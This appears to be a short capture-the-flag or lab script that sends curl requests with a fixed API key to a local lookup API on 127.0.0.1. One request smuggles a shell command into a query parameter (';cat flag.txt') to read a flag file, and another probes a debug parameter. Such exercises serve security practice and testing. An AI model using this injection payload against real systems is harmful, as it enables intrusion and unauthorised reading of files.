#!/bin/bash

curl "http://127.0.0.1:5000/api/v1/lookup/example.com" -X POST -H "X-API: GQ6hbr9l1c4yZA8mc5rdmYQ6hWolLXJATK67C3aj"
curl "http://127.0.0.1:5000/api/v1/lookup/example.com?domain=;cat%20flag.txt" -X PUT -H "X-API: GQ6hbr9l1c4yZA8mc5rdmYQ6hWolLXJATK67C3aj"
curl "http://127.0.0.1:5000/api/v1/lookup/example.com?debug=true" -X GET -H "X-API: GQ6hbr9l1c4yZA8mc5rdmYQ6hWolLXJATK67C3aj"
sleep 35
curl "http://127.0.0.1:5000/api/v1/lookup/example.com" -X POST -H "X-API: GQ6hbr9l1c4yZA8mc5rdmYQ6hWolLXJATK67C3aj"
curl "http://127.0.0.1:5000/api/v1/lookup/example.com" -X POST -H "X-API: GQ6hbr9l1c4yZA8mc5rdmYQ6hWolLXJATK67C3aj"

